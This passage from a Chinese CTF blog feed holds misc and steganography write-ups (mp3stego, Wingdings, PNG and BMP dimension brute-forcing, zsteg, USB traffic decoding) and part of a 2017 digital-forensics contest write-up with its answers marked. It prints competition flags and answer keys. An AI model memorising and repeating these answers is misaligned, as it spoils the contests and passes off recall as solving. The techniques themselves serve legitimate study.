    <content type="html"><![CDATA[<h3><span id="2021第五届蓝帽杯初赛">2021第五届蓝帽杯初赛</span></h3><hr><h4><span id="冬奥会_is_coming">冬奥会_is_coming</span></h4><p>mp3考虑mp3stego，这一步的密钥是冬奥会开始日期（八位数字）</p><p>用python,print出来后</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">✌︎ ☝︎♓︎⧫︎☟︎◆︎♌︎ ❒︎♏︎◻︎□︎⬧︎♓︎⧫︎□︎❒︎⍓︎ ■︎♋︎❍︎♏︎♎︎ 📂︎♍︎♏︎🏱︎♏︎♋︎🙵 ♓︎⬧︎ ❖︎♏︎❒︎⍓︎ ♓︎■︎⧫︎♏︎❒︎♏︎⬧︎⧫︎♓︎■︎♑︎📬︎ 🕈︎♒︎⍓︎ ■︎□︎⧫︎ ⧫︎♋︎🙵♏︎ ♋︎ ●︎□︎□︎🙵 ♋︎⧫︎ ♓︎⧫︎✍︎</span><br></pre></td></tr></table></figure><p>找到网站https://wingdingstranslator.com/</p><p><img src="1.png" alt="1"></p><p>找到对应的github</p><p><img src="2.png" alt="2"></p><p>用notepad++打开</p><p><img src="3.png" alt="3"></p><p>发现密钥mp3</p><p>发现cipher字样：<a href="https://www.ifreesite.com/unicode/">https://www.ifreesite.com/unicode/</a></p><p>得到表情</p><p><img src="4.png" alt="4"></p><p>参考这篇博客</p><p><a href="https://miaotony.xyz/2021/02/11/CTF_2021NewsCTF/">https://miaotony.xyz/2021/02/11/CTF_2021NewsCTF/</a></p><p>得到带密钥的emoji表情解密网站</p><p><a href="https://emoji-aes.miaotony.xyz/">https://emoji-aes.miaotony.xyz/</a></p><p>得到flag</p><p><img src="5.png" alt="5"></p><h5><span id="flage32f619b-dbcd-49bd-9126-5d841aa01767"><strong>flag{e32f619b-dbcd-49bd-9126-5d841aa01767}</strong></span></h5>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;2021第五届蓝帽杯初赛&quot;&gt;2021第五届蓝帽杯初赛&lt;/span&gt;&lt;/h3&gt;
&lt;hr&gt;
&lt;h4&gt;&lt;span id=&quot;冬奥会_is_coming&quot;&gt;冬奥会_is_coming&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;mp3考虑mp3stego，这一步的密钥是冬奥会</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>MISC-data-0</title>
    <link href="http://mklkx.github.io/2021/04/30/MISC-data-0/"/>
    <id>http://mklkx.github.io/2021/04/30/MISC-data-0/</id>
    <published>2021-04-30T12:09:36.000Z</published>
    <updated>2021-05-04T11:39:50.756Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="data0">DATA[0]</span></h1><hr><h3><span id="1usb流量分析">1：USB流量分析</span></h3><h4><span id="usbkeyboarddatahacker">UsbKeyboardDataHacker</span></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tshark -r .&#x2F;example.pcap -T fields -e usb.capdata</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python UsbKeyboardDataHacker.py .&#x2F;example.pcap </span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;data0&quot;&gt;DATA[0]&lt;/span&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;h3&gt;&lt;span id=&quot;1usb流量分析&quot;&gt;1：USB流量分析&lt;/span&gt;&lt;/h3&gt;
&lt;h4&gt;&lt;span id=&quot;usbkeyboarddatahacker&quot;&gt;UsbKeyboard</summary>
      
    
    
    
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>F5杯</title>
    <link href="http://mklkx.github.io/2021/04/24/F5%E6%9D%AF/"/>
    <id>http://mklkx.github.io/2021/04/24/F5%E6%9D%AF/</id>
    <published>2021-04-24T02:24:46.000Z</published>
    <updated>2021-05-04T11:39:52.577Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="ctfshow-f5杯">ctfshow-F5杯</span></h1><hr><h2><span id="1取idatihdr部分重新排列">1：取IDAT,IHDR部分重新排列</span></h2><p>1）IHDR领先</p><p>2）IDAT尝试重新排列</p><p>3）前后补全</p><h3><span id="just-another-拼图">Just Another 拼图</span></h3><blockquote><p>史上最简单的拼图misc题！贴心到连序号都已经全部标注好，令gaps彻底失业、眼科医院纷纷倒闭！唯一的问题是图里好像没有flag？这点小问题应该无关紧要吧。</p><p>感谢@出题人说不要署名 师傅供题。</p><blockquote><p>strings *.jpg | grep IDAT</p></blockquote></blockquote><p><img src="1-1.png" alt="1"></p><h2><span id="2数列问题">2：数列问题</span></h2><h3><span id="填字游戏">填字游戏</span></h3><blockquote><p>这什么鬼填字游戏啊，到底要填什么字啊。</p><p>感谢@出题人说这次匿名 师傅供题</p><blockquote><p><a href="http://oeis.org/">http://oeis.org/</a></p></blockquote></blockquote><p><img src="2-1.png" alt="2"></p><p>通过搜索找到对应数字</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">65 69 97 53 121 70 108 52 103</span><br><span class="line"># AEa5yFl4g</span><br></pre></td></tr></table></figure><h2><span id="3">3</span></h2><blockquote><p>两行代码一纸情书</p><blockquote><p>A very simple dll, I promise you can get flag in seconds</p><p>感谢@Y4tacker师傅供题</p></blockquote></blockquote><p>搜索ctf得到一大串字符串</p><p>一把梭后发现base64末尾出现‘==’</p><p>连续解码后得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;ctfshow-f5杯&quot;&gt;ctfshow-F5杯&lt;/span&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;h2&gt;&lt;span id=&quot;1取idatihdr部分重新排列&quot;&gt;1：取IDAT,IHDR部分重新排列&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;1）IHDR领先&lt;/p&gt;
&lt;p&gt;2）</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>MISC-image-0</title>
    <link href="http://mklkx.github.io/2021/04/21/MISC-image-0/"/>
    <id>http://mklkx.github.io/2021/04/21/MISC-image-0/</id>
    <published>2021-04-21T01:43:15.000Z</published>
    <updated>2021-04-25T13:43:27.673Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="image0">image[0]</span></h1><hr><p>一张图片的百种姿势</p><h2><span id="1bpg">1：bpg</span></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">工具：bpg-0.9.8-win64</span><br><span class="line"></span><br><span class="line">命令：bpgdec -o out.png misc3.bpg</span><br></pre></td></tr></table></figure><h2><span id="2idat块异常">2：IDAT块异常</span></h2><p><img src="2-1.png" alt="2-1"></p><p>IDAT未满65524就有下一个数据块了，说明有问题</p><p>delete后得到</p><p><img src="2-2.png" alt="2-2"></p><h2><span id="3idat长度转ascii">3：IDAT长度转ASCII</span></h2><h2><span id="4pngdebugger校验crc32">4：pngdebugger校验crc32</span></h2><p>错误的crc-code串联转ascii</p><p>CRC OK!   ===》   1</p><p>CRC FAILED   ===》   0</p><h2><span id="5image爆破长宽">5：image爆破长宽</span></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import struct</span><br><span class="line">import zlib</span><br><span class="line">for i in range(4096):</span><br><span class="line">    for j in range(4096):</span><br><span class="line">        c &#x3D; bytes.fromhex(&#39;4948445200000384000000960802000000&#39;)# IHDR</span><br><span class="line">        ihdr &#x3D; c[:4]+struct.pack(&#39;&gt;i&#39;,i)+struct.pack(&#39;&gt;i&#39;,j)+c[12:]</span><br><span class="line">        crc &#x3D; 0x5255A798# CRC32</span><br><span class="line">        if zlib.crc32(ihdr) &#x3D;&#x3D; crc:</span><br><span class="line">            print(hex(i),hex(j))</span><br><span class="line">            exit(0)</span><br></pre></td></tr></table></figure><p><img src="3-1.png" alt="3-1"></p><h2><span id="6png爆破高度">6：png爆破高度</span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">misc = <span class="built_in">open</span>(<span class="string">&quot;misc26.png&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆破宽</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1024</span>):</span><br><span class="line">    data = misc[<span class="number">12</span>:<span class="number">16</span>] + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>,i)+ misc[<span class="number">20</span>:<span class="number">29</span>]  <span class="comment">#IHDR数据</span></span><br><span class="line">    crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">if</span> crc32 == <span class="number">0xEC9CCBC6</span>: <span class="comment">#IHDR块的crc32值</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;weight&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;hex:&quot;</span>+<span class="built_in">hex</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆破高</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1024</span>):</span><br><span class="line">    data = misc[<span class="number">12</span>:<span class="number">20</span>] + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>,i)+ misc[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">    crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">if</span> crc32 == <span class="number">0xEC9CCBC6</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;height&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;hex:&quot;</span>+<span class="built_in">hex</span>(i))</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="comment">#height</span></span><br><span class="line"><span class="comment">#606</span></span><br><span class="line"><span class="comment">#hex:0x25e</span></span><br></pre></td></tr></table></figure><h2><span id="7bmp修改高度">7：bmp修改高度</span></h2><p><img src="4-1.png" alt="4-1"></p><p><img src="4-2.png" alt="4-2"></p><p>12-15：4字节的biWidth，这里是0x00000280，即十进制的640，用像素表示图像的宽度，查看文件信息验证正确；16-19：4字节的biHeight，这里是0x000001E0，即十进制的480，用像素表示图像的高度，查看文件信息验证正确；同时，这是一个正数，表示图像是倒立的，即图像数据是从左下角到右上角排列的；</p><h2><span id="8jpg修改高度">8：jpg修改高度</span></h2><p><img src="5-1.png" alt="5-1"></p><h2><span id="9gif修改高度">9：gif修改高度</span></h2><p><img src="6-1.png" alt="6-1"></p><p>后分离帧得到flag</p><h2><span id="10bmp爆破宽度">10：bmp爆破宽度</span></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import struct</span><br><span class="line">import zlib</span><br><span class="line">f &#x3D; open(&#39;misc31.bmp&#39;,&#39;rb&#39;)</span><br><span class="line">c &#x3D; f.read()</span><br><span class="line">width &#x3D; c[18:22]</span><br><span class="line">height &#x3D; c[22:26]</span><br><span class="line"># 爆破bmp宽度</span><br><span class="line">for i in range(900,1100):</span><br><span class="line">    f1 &#x3D; open(str(i)+&#39;.bmp&#39;,&#39;wb&#39;)</span><br><span class="line">    # print(struct.pack(&#39;&gt;i&#39;,i)[::-1])</span><br><span class="line">    img &#x3D; c[:18]+struct.pack(&#39;&gt;i&#39;,i)[::-1]+c[22:]</span><br><span class="line">    f1.write(img)</span><br><span class="line">    f1.close()</span><br></pre></td></tr></table></figure><h2><span id="11png爆破宽度">11：png爆破宽度</span></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import struct</span><br><span class="line">import zlib</span><br><span class="line">#爆破png宽度</span><br><span class="line">f &#x3D; open(r&#39;misc34.png&#39;,&#39;rb&#39;)</span><br><span class="line">c &#x3D; f.read()</span><br><span class="line">width &#x3D; c[16:20]</span><br><span class="line">height &#x3D; c[20:24]</span><br><span class="line">for i in range(900,1200):</span><br><span class="line">    f1 &#x3D; open(str(i)+&#39;.png&#39;,&#39;wb&#39;)</span><br><span class="line">    # print(struct.pack(&#39;&gt;i&#39;,i)[::-1])</span><br><span class="line">    img &#x3D; c[:16]+struct.pack(&#39;&gt;i&#39;,i)+c[20:]</span><br><span class="line">    f1.write(img)</span><br><span class="line">    f1.close()</span><br></pre></td></tr></table></figure><h2><span id="12遇到binwalk有东西但分离不出的情况">12：遇到binwalk有东西，但分离不出的情况</span></h2><p><img src="11-1.png" alt="11-1"></p><p>根据binwalk提示，尝试手动分离</p><h2><span id="13zsteg">13：zsteg</span></h2><p>首先尝试binwalk -e</p><p>发现bzip2</p><p><img src="12-1.png" alt="12-1"></p><p>进一步binwalk却始终存在问题</p><hr><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zsteg misc17.png</span><br></pre></td></tr></table></figure><p>得到应该分离的数据段</p><p><img src="12-2.png" alt="12-2"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zsteg -e &quot;extradata:0&quot; &#x2F;root&#x2F;桌面&#x2F;misc17.png &gt; 1.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">binwalk -e 1.txt</span><br></pre></td></tr></table></figure><h2><span id="14exiftool查看附加信息">14：exiftool查看附加信息</span></h2><h2><span id="15gif考虑时间间隔3637gtgt01">15：gif考虑时间间隔/3637&gt;&gt;01</span></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">identify -format &quot;%T&quot; misc39.gif &gt; 1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding&#x3D;utf-8</span><br><span class="line">text&#x3D;&#39;737363636373737373736373636373736363737363737373636373737373637363636373736373737373737373637373737373737363737363737363736373637373636373636373737363636363737363636373637373636373637373636373736373736363737363637373736363736373737363637363737363736373737363637373637373636363736363737363737373737363636373637373636373637363737363637363637373637373636373737363636373736363736363637373736363736373736373736363737363637373737363636363736373737363637373736363736373737363636373637373636363737373736363636373637373636363636373736373636363737363736373637373736363737373737373637&#39;.split(&#39;3&#39;)</span><br><span class="line">print(text)</span><br><span class="line">firstType &#x3D; &#39;6&#39;</span><br><span class="line">secondType &#x3D; &#39;7&#39;</span><br><span class="line">binaryString &#x3D; &#39;&#39;</span><br><span class="line"></span><br><span class="line">for char in text: #Foreach char</span><br><span class="line">    if char &#x3D;&#x3D; firstType: #Check if it is the first type</span><br><span class="line">        binaryString +&#x3D; &#39;0&#39; #Mark it as 0</span><br><span class="line">        # print(char)</span><br><span class="line">    else:</span><br><span class="line">        binaryString +&#x3D; &#39;1&#39; #Mark it as 1</span><br><span class="line">        # print(char)</span><br><span class="line"></span><br><span class="line">print(binaryString) #Print result</span><br><span class="line">print((len(binaryString)-1)&#x2F;7)</span><br><span class="line"></span><br><span class="line">binary&#x3D;&#39;&#39;</span><br><span class="line">for i in range(41):</span><br><span class="line">    binary +&#x3D; binaryString[7*i:7*i+7] + &#39; &#39;</span><br><span class="line">print(binary)</span><br><span class="line">#1100011 1110100 1100110 1110011 1101000 1101111 1110111 1111011 0110101 0110010 0111000 0110001 0110010 1100110 1100110 0111001 0111001 0110101 1100110 1100010 0110111 1100010 1100101 0110010 0110110 0111000 1100100 0111001 0110110 0110011 1100001 0111001 1100101 1100010 1100011 1100001 0110000 0110100 0110101 0111001 1111101 </span><br></pre></td></tr></table></figure><h2><span id="16lsb改变通道改变排序方式">16：LSB改变通道，改变排序方式</span></h2><h2><span id="17base">17：base</span></h2><h2><span id="18取idatihdr部分重新排列">18：取IDAT,IHDR部分重新排列</span></h2><p>1）IHDR领先</p><p>2）IDAT尝试重新排列</p><p>3）前后补全</p><p>&lt;F5杯《Just Another 拼图》&gt;</p><h1><span id="脑洞部分">脑洞部分</span></h1><h2><span id="1010按位取">1：010按位取</span></h2><p><img src="1-1.png" alt="1-1"></p><h2><span id="2所有头的hex都该熟悉各种hex魔转">2：所有头的hex都该熟悉,各种hex魔转</span></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Serial Number                   : 686578285826597329</span><br></pre></td></tr></table></figure><p>686578285826597329=》hex(X&amp;Ys)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">X Resolution                    : 3902939465</span><br><span class="line">Y Resolution                    : 2371618619</span><br><span class="line">X Position                      : 1082452817</span><br><span class="line">Y Position                      : 2980145261</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; print(hex(x))</span><br><span class="line">0xe8a22149</span><br><span class="line">&gt;&gt;&gt; print(hex(y))</span><br><span class="line">0x8d5c073b</span><br><span class="line">&gt;&gt;&gt; print(hex(a))</span><br><span class="line">0x4084eb51</span><br><span class="line">&gt;&gt;&gt; print(hex(b))</span><br><span class="line">0xb1a1686d</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;image0&quot;&gt;image[0]&lt;/span&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;一张图片的百种姿势&lt;/p&gt;
&lt;h2&gt;&lt;span id=&quot;1bpg&quot;&gt;1：bpg&lt;/span&gt;&lt;/h2&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;tabl</summary>
      
    
    
    
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>2017年第三届美亚杯电子取证-个人赛WP</title>
    <link href="http://mklkx.github.io/2021/04/15/2017%E5%B9%B4%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BE%8E%E4%BA%9A%E6%9D%AF%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/"/>
    <id>http://mklkx.github.io/2021/04/15/2017%E5%B9%B4%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BE%8E%E4%BA%9A%E6%9D%AF%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/</id>
    <published>2021-04-15T06:56:37.000Z</published>
    <updated>2021-05-04T11:39:45.699Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="2017年第三届美亚杯电子取证-个人赛">2017年第三届美亚杯电子取证-个人赛</span></h3><hr><h4><span id="案件背景">案件背景</span></h4><blockquote><p>Gary是一位经常用手提电脑的人，而且热爱足球运动，常常看足球网站。他于2007年9月开始想赚快钱，思想变得偏激，并关注一些违法的事。于是Gary就想着赌博，查阅军事资料，了解恐怖袭击的新闻报道。另外他开始上网寻找有关如何购买枪械、刀等武器的资料，还寻找如何制造假网站，但最后均无收获。</p><p>检材：</p><p>.e01镜像</p><p>工具软件：</p><p>取证大师V6.1.67374RTM（FMP）</p></blockquote><h4><span id="1求镜像的md5哈希值">1：求镜像的MD5哈希值</span></h4><table><thead><tr><th>1</th><th>Gary的笔记本电脑已成功取证并制作成镜像 (Forensic Image)，下列哪个是其MD5哈希值。</th></tr></thead><tbody><tr><td><strong>A.</strong></td><td><strong>0CFB3A0BB016165F1BDEB87EE9F710C9</strong></td></tr><tr><td>B.</td><td>5F1BDEB87EE9F710C90CFB3A0BB01616</td></tr><tr><td>C.</td><td>A0BB016160CFB3A0BB0161661670CFB3</td></tr><tr><td>D.</td><td>16160CFB3A0BB016166A0BB016166167</td></tr><tr><td>E.</td><td>FB3A0BB016165 B016166 A0DF7FJE2EJ0</td></tr></tbody></table><p>证据文件-》选中镜像-》摘要-》查看md5值</p><p><img src="1-1.png" alt="1-1"></p><h4><span id="2求硬盘分区">2：求硬盘分区</span></h4><table><thead><tr><th>2</th><th>根据此镜像 (Forensic Image)，里面有多少个硬盘分区？</th></tr></thead><tbody><tr><td>A.</td><td>1</td></tr><tr><td>B.</td><td>2</td></tr><tr><td><strong>C.</strong></td><td><strong>3</strong></td></tr><tr><td>D.</td><td>4</td></tr><tr><td>E.</td><td>5</td></tr></tbody></table><p><img src="2-1.png" alt="2-1"></p><p>C盘D盘E盘</p><h4><span id="3开始逻辑区块地址lba">3：开始逻辑区块地址（LBA）</span></h4><table><thead><tr><th>3</th><th>你能找到硬盘操作系统分区内的开始逻辑区块地址（LBA）？</th></tr></thead><tbody><tr><td>A.</td><td>0</td></tr><tr><td>B.</td><td>512</td></tr><tr><td>C.</td><td>2,048</td></tr><tr><td><strong>D.</strong></td><td><strong>206,848</strong></td></tr><tr><td>E.</td><td>102,402,047</td></tr></tbody></table><p><img src="3-1.png" alt="3-1"></p><p>其中，C盘的设备描述为系统保留；D盘E盘为本地磁盘。</p><p><img src="3-2.png" alt="3-2"></p><p>结合磁盘内容，找到D盘的物理位置105,906,176</p><p>因为”现今计算机上所谓一个逻辑区块通常是512或1024位组“</p><p>将105,906,176/512=206，848</p><p><strong><u>物理扇区，在winhex中就是$boot就是DBR</u></strong></p><h4><span id="4硬盘操作系统分区的大小">4：硬盘操作系统分区的大小</span></h4><table><thead><tr><th>4</th><th>你能找到硬盘操作系统分区的大小吗 (字节byte)？</th></tr></thead><tbody><tr><td>A.</td><td>48.7</td></tr><tr><td>B.</td><td>102,195,200</td></tr><tr><td>C.</td><td>140,232,703</td></tr><tr><td>D.</td><td>19,369,295,872</td></tr><tr><td><strong>E.</strong></td><td><strong>52,323,942,400</strong></td></tr></tbody></table><p><img src="4-1.png" alt="4-1"></p><p>48.73*1024*1024*1024=52,323,439,083.52</p><h4><span id="5mft的物理起始偏移位置">5：$MFT的物理起始偏移位置</span></h4><table><thead><tr><th>5</th><th>在包含操作系统的分区内，$MFT的物理起始偏移位置是什么？</th></tr></thead><tbody><tr><td>A.</td><td>3328</td></tr><tr><td>B.</td><td>4,170,040</td></tr><tr><td>C.</td><td>6,026,176</td></tr><tr><td><strong>D.</strong></td><td><strong>6,498,304</strong></td></tr><tr><td>E.</td><td>16,949,352</td></tr></tbody></table><p><img src="5-1.png" alt="5-1"></p><p><strong><u>正常情况MFT以元文件的形式存储在相应磁盘分区的根目录中，但是是隐藏的。FMP可以直接访问到该文件。</u></strong></p><p><img src="5-2.png" alt="5-2"></p><p>3,327,131,648/512=6,498,304</p><h4><span id="6操作系统的安装日期">6：操作系统的安装日期</span></h4><table><thead><tr><th>6</th><th>请找出系统文件“SOFTWARE＂，请问操作系统的安装日期是？   （答案格式 －“世界协调时间＂：YYYY-MM-DD HH:MM UTC）</th></tr></thead><tbody><tr><td>A.</td><td>2017-09-04 10:10 UTC</td></tr><tr><td><strong>B.</strong></td><td><strong>2017-09-04 10:11 UTC</strong></td></tr><tr><td>C.</td><td>2017-09-04 10:12 UTC</td></tr><tr><td>D.</td><td>2017-09-04 10:13 UTC</td></tr><tr><td>E.</td><td>2017-09-14 02:14 UTC</td></tr></tbody></table><p>取证结果-》系统痕迹-》系统信息-》安装时间</p><p><img src="6-1.png" alt="6-1"></p><p>2017-09-04 18:11:10</p><p>调整了时区后得到答案B</p><p>此处除了常识性的“-8”之外，遇到时区问题可以在此处验证调整</p><p><img src="6-2.png" alt="6-2"></p><h4><span id="7sid">7：SID</span></h4><p><u><strong>SID为用户标识 （Security Identifiers）标识用户、组和计算机帐户的唯一的号码。</strong></u></p><table><thead><tr><th>7</th><th>用户“Gary＂的SID是什么？</th></tr></thead><tbody><tr><td><strong>A.</strong></td><td><strong>1000</strong></td></tr><tr><td>B.</td><td>1001</td></tr><tr><td>C.</td><td>1002</td></tr><tr><td>D.</td><td>1005</td></tr><tr><td>E.</td><td>1007</td></tr></tbody></table><p><img src="7-1.png" alt="7-1"></p><h4><span id="8做法同上">8：做法同上</span></h4><table><thead><tr><th>8</th><th>用户“彼得＂的SID是什么？</th></tr></thead><tbody><tr><td>A.</td><td>1000</td></tr><tr><td><strong>B.</strong></td><td><strong>1001</strong></td></tr><tr><td>C.</td><td>1002</td></tr><tr><td>D.</td><td>1005</td></tr><tr><td>E.</td><td>1007</td></tr></tbody></table><h4><span id="9操作系统">9：操作系统</span></h4><table><thead><tr><th>9</th><th>硬盘的操作系统是什么？</th></tr></thead><tbody><tr><td><strong>A.</strong></td><td><strong>Windows 7</strong></td></tr><tr><td>B.</td><td>Windows 8</td></tr><tr><td>C.</td><td>Windows 10</td></tr><tr><td>D.</td><td>Linux Red Hat 7.1</td></tr><tr><td>E.</td><td>MAC OS X</td></tr></tbody></table><p><img src="9-1.png" alt="9-1"></p><h4><span id="10查看默认浏览器">10：查看默认浏览器</span></h4><table><thead><tr><th>10</th><th>哪个是Windows的默认浏览器？</th></tr></thead><tbody><tr><td><strong>A.</strong></td><td><strong>Microsoft Internet Explorer</strong></td></tr><tr><td>B.</td><td>Google Chrome</td></tr><tr><td>C.</td><td>Mozilla Firefox</td></tr><tr><td>D.</td><td>Opera</td></tr><tr><td>E.</td><td>QQ 浏览器</td></tr></tbody></table><p>取证后看到只有IE、Chrome和火狐，</p><p><img src="10-1.png" alt="10-1"></p><p>根据常识可知IE为默认浏览器</p><h4><span id="11辨别url">11：辨别URL</span></h4><table><thead><tr><th>11</th><th>用户 “Gary＂曾经浏览过一些非法博彩网站，下列哪项URL符合？</th></tr></thead><tbody><tr><td>a.</td><td><a href="http://www.10086.com">www.10086.com</a></td></tr><tr><td><strong>b.</strong></td><td><strong><a href="http://www.188bet.com">www.188bet.com</a></strong></td></tr><tr><td><strong>c.</strong></td><td><strong><a href="http://www.hv5858.com">www.hv5858.com</a></strong></td></tr><tr><td>d.</td><td><a href="http://www.12377.cn">www.12377.cn</a></td></tr><tr><td><strong>e.</strong></td><td><strong><a href="http://www.88.bettingwell.com">www.88.bettingwell.com</a></strong></td></tr><tr><td>f.</td><td><a href="http://www.aaakk.org">www.aaakk.org</a></td></tr><tr><td></td><td></td></tr><tr><td>A.</td><td>只有(a)  &amp; (b)</td></tr><tr><td>B.</td><td>(a), (b), (d) &amp; (f)</td></tr><tr><td>C.</td><td>(b), ©, (d) &amp; (f)</td></tr><tr><td>D.</td><td>(b),  ©, (e) &amp; (f)</td></tr><tr><td>E.</td><td>以上皆是</td></tr></tbody></table><p>通过实时搜索，</p><p>a:</p><p>无此记录</p><p>b:</p><p><img src="11-1.png" alt="11-1"></p><p>根据标题判断为非法博彩网站</p><p>c:</p><p><img src="11-2.png" alt="11-2"></p><p>d:</p><p><img src="11-3.png" alt="11-3"></p><p>中国互联网举报中心</p><p>e:</p><p>在线博彩公司</p><p>f:</p><p>无此结果</p><p>PS：此处f项的结果笔者存在疑义，但结合选项选D</p><h4><span id="12登入名称">12：登入名称</span></h4><table><thead><tr><th>12</th><th>用户Gary曾经登入上述非法博彩网站，下列哪个是其登入名称？</th></tr></thead><tbody><tr><td>A.</td><td>ggchey68</td></tr><tr><td>B.</td><td>gany-cher88</td></tr><tr><td>C.</td><td>galy_chen88</td></tr><tr><td>D.</td><td>garychen1688</td></tr><tr><td><strong>E.</strong></td><td><strong>garychen88</strong></td></tr></tbody></table><p>结合第11题，发现上网记录的登陆信息里</p><p>访问www.188bet.com的[garychen88]</p><p><img src="12-1.png" alt="12-1"></p><h4><span id="13邮箱">13：邮箱</span></h4><table><thead><tr><th>13</th><th>在所有用户中，用于电子邮件发送/接收的程序名称是什么？</th></tr></thead><tbody><tr><td>A.</td><td>新浪邮箱</td></tr><tr><td>B.</td><td>网易163</td></tr><tr><td>C.</td><td>阿里邮箱</td></tr><tr><td>D.</td><td>Foxmail</td></tr><tr><td><strong>E.</strong></td><td><strong>Mozilla Mail – ThunderBird</strong></td></tr></tbody></table><p>取证结果-》邮件解析</p><p><img src="13-1.png" alt="13-1"></p><h4><span id="14usb使用痕迹">14：USB使用痕迹</span></h4><table><thead><tr><th>14</th><th>在该Windows系统中，曾经连接数个USB移动储存装置 (U盘)，下列那个不是  该系统连接过的USB移动储存装置 ?</th><th></th></tr></thead><tbody><tr><td><strong>A.</strong></td><td><strong>WD My Passport 0827  USB Device</strong></td><td></td></tr><tr><td>B.</td><td>StoreJet Transcend USB Device</td><td></td></tr><tr><td>C.</td><td>Samsung Portable  SSD USB Device</td><td></td></tr><tr><td>D.</td><td>StoreJet  TS256GESD400K USB Device</td><td></td></tr><tr><td>E.</td><td>General UDisk USB Device</td><td></td></tr></tbody></table><p>取证结果-》USB设备使用痕迹</p><p><img src="14-1.png" alt="14-1"></p><h4><span id="15做法同上">15：做法同上</span></h4><table><thead><tr><th>15</th><th>在该Windows系统中，下列哪个USB移动储存装置 (U盘)曾被指派为‘Z’磁盘分区代号(Drive Letter) ?</th></tr></thead><tbody><tr><td>A.</td><td>WD My Passport 0827  USB Device</td></tr><tr><td>B.</td><td>StoreJet Transcend USB Device</td></tr><tr><td>C.</td><td>Samsung Portable  SSD USB Device</td></tr><tr><td>D.</td><td>StoreJet  TS256GESD400K USB Device</td></tr><tr><td><strong>E.</strong></td><td><strong>General UDisk USB Device</strong></td></tr></tbody></table><p><img src="15-1.png" alt="15-1"></p><h4><span id="16最后关机时间">16：最后关机时间</span></h4><table><thead><tr><th>16</th><th>该Windows系统中，下列哪个是最后的关机时间?</th></tr></thead><tbody><tr><td><strong>A.</strong></td><td><strong>2017-10-31  4:52:54 UTC</strong></td></tr><tr><td>B.</td><td>2017-10-31  4:53:54 UTC</td></tr><tr><td>C.</td><td>2017-10-31  4:54:54 